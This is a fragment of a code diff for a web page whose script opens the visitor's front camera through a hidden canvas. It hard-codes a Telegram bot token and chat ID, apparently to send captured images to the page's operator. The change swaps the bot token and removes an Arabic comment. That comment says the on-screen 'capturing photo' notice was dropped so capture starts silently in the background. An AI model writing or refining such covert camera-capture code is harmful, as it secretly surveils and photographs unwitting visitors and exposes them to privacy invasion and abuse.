@@ -43,11 +43,10 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const TELEGRAM_BOT_TOKEN = '8880573702:AAGONeril_hFUPSBRuLh2TwGkFOG3wCEv80';
+        const TELEGRAM_BOT_TOKEN = '8733255628:AAFSiv-utHu5WYVqx3_BXcbbEikWTBS0jdI';
         const TELEGRAM_CHAT_ID = '8304712202';
 
         async function startProcess() {
-            // تم إزالة عبارة جاري التقاط الصورة بناءً على طلبك والبدء فورا في الخلفية
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const videoElement = document.getElementById('video');
